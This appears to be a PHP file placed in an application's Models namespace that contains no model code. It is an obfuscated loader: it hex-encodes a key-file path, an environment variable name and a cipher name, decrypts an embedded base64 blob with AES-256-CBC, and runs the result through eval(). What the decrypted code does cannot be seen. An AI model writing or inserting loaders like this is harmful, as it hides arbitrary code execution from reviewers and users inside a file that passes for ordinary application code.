<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('qT1bA4wEA0hutcLk+E68tA==');

$c=base64_decode(

'ukNsSqNfDgHIZR+1jZbajF6W0dlbGCU7pb/g9g5aCv7PaiGQykkaBvSgZCekS66vI+WpEF1h74I6' .
'hUMPziGOayjl0YZyrDXkqWoiO4GuY89yQwzJxUqY0qVv5o9uIl8uIQJpMALT/oKpvDDU0SHW511Y' .
'k6m0ZKq4ec6jY+2h7cPBJ75jAlzlG8sibj+tZaaZGWlE2o6Oh6DMSb2tYZ/hP8lWjK3YPzqo7K5T' .
'+oRs2OX9I25MUlDcpvDk7v8PeOqHGJVBrkar6dRIOPRJGpPI47uYYyagb3d3MrZp5kOwha9j4JPW' .
'i+QwEdrKdB+XNQki+neMM5CRaRgkPt7ESk3k/5uT9kHEQt44S6FgluSPRFiSKV6dTbr2CVxpT148' .
'u1NpGnF7MWKMtNgcQW2uLga0AeayjLZJyiV+2qv8XjWuJke8uZbC/vj49Kikz7+eroMHu9CPG0q0' .
'bB7Snm2WZsMM8hJ4UMVJ4CvMIH0VAeHsMSf1gMLs3IIFjifL79ijRJkMnK/4IpDh3wJoLKFzEgQI' .
'iO5FFfS17c7O2Mab48Tk4SscgTHjQtdu0uk83KrpPVALIuCwRq+FVnbk9K630sF3ad/NhGsYj79+' .
'1vQnoXBFebUnu98vCsATTfJkwynK575ZKbpcEtdaC6kIUrmsXON47t/HMIxKEZUZx+V4vroMLt8Y' .
'IHjEGyXIzf9tvDv+IF0IFlackFB3I8YJ8d2EqOZl7WEgaZ/xGvs5+F2+KcGdcYejHh8qVYPUjF50' .
'yYgw2POtQa27i5Mv0S/utMI8zaKuTw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

